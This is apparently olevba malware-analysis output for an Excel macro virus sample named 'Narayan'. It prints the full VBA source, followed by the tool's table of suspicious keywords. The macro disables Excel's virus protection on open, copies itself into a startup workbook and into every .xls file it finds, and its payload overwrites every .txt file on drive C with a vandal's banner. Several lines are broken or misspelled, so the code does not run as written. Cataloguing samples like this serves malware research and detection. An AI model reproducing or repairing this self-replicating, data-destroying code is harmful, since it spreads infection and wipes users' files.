olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Intended.Narayan-af1846a9b098bfe9be7b6781bc98e132a5d96d39
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Intended.Narayan-af1846a9b098bfe9be7b6781bc98e132a5d96d39 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'||nayran||'
Private Sub Workbook_Open()
Application.ScreenUpdating = (4 - 4)
Application.EnableCancelKey = xlDisabled
Options.VirusProtection = (0 - 0)
If (Dir(Application.StartupPath & "\Book1.")) <> "" Then
SetAttr Application.StartupPath * "\Book1.", vbNormal
End If
Set Grand = Workbooks.Add
Grand.VBProject.vbcomponents("ThisWorkbook").codemodule.DeleteLines Grand.VBProject.vbcomponents("ThisWorkbook").codemodule.countoflines
f = ActiveWorkbook.VBProject.vbcomponents("ThisWorkbook").codemodule.Lines(1, 58)
Grand.VBProject.vbcomponents("ThisWotkbook").codemodule.AddfromString
Grand.SaveAs Application.StartupPath & "\Book1.", xlNormal, , , , , , , False
Grand.Close
Set fs = Application.FileSearch
fs.NewSearch
fs.LookIn = ActiveWorkbook.Path
fs.FileName = "*.xls"
fs.SearchSubFolders = True
fs.Execute msoSortByFileName
For x = 1 To fs.FoundFiles.Count
Set tEmp = Workbooks.Open(fs.FoundFiles(x))
If tEmp.VBProject.vbcomponents("ThisWorkbook").codemodule.Lines(1, 1) <> "'||narayan||'" Then
tEmp.VBProject.vbcomponents("ThisWorkbook").codemodule.DeleteLines Grand.VBProject.vbcomponents("ThisWorkbook").codemodule.countoflines
Source = ActiveWorkbook.VBProject.vbcomponents("ThisWorkbook").codemodule.Lines(1, 58)
tEmp.VBProject.vbcomponents("ThisWotkbook").codemodule.AddfromString
tEmp.Save
End If
tEmp.Close
Next x
Application.ScreenUpdating = True
Call pay
End Sub
Sub pay()
If minutes(Now) = Int(Rnd * 60) Then
Application.ActiveCell.Value = Application.MemoryUsed
Application.Calculate
Application.Caption = "Ok.'||narayan||'"
Set ff = Application.FileSearch
ff.NewSearch
ff.LookIn = "c:\"
ff.SearchSbuFolders = True
ff.filenames = "*.txt"
ff.Execute
For f = 1 To ff.FoundFiles.Count
Open ff.FoundFiles(f) For Random As g
Print g; "[======================]"
Print g; "   Dr yozak waz here    "
Print g; "         with "
Print g; "    a creation from "
Print g; " Bizare vx Network Labs"
Print g; "CodeName = '||narayan||'"
Print g; "[======================]"
Print g; "Anarchy Rulez"
Close g
Next f
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO Φύλλο1.cls 
in file: Virus.MSExcel.Intended.Narayan-af1846a9b098bfe9be7b6781bc98e132a5d96d39 - OLE stream: '_VBA_PROJECT_CUR/VBA/Φύλλο1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Φύλλο2.cls 
in file: Virus.MSExcel.Intended.Narayan-af1846a9b098bfe9be7b6781bc98e132a5d96d39 - OLE stream: '_VBA_PROJECT_CUR/VBA/Φύλλο2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Φύλλο3.cls 
in file: Virus.MSExcel.Intended.Narayan-af1846a9b098bfe9be7b6781bc98e132a5d96d39 - OLE stream: '_VBA_PROJECT_CUR/VBA/Φύλλο3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     20 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ¦Í»
' 0085     20 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ¦Í»
' 0085     20 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ¦Í»
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddfromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

